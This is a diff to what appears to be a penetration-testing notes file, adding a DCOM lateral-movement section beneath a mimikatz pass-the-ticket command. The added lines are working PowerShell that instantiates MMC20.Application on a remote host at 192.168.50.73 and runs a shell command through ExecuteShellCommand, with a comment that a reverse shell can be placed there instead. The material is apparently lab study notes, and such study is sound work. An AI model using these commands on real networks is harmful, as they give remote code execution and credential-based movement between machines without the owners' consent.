@@ -123,3 +123,14 @@ kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
 
 klist
 ```
+
+#### DCOM
+*DCOM is performed over RPC on TCP port 135 and local administrator access is required to call the DCOM Service Control Manager*
+```
+$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"))
+
+$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
+
+tasklist | findstr "calc"
+```
+//We can also set a revshell into cmd
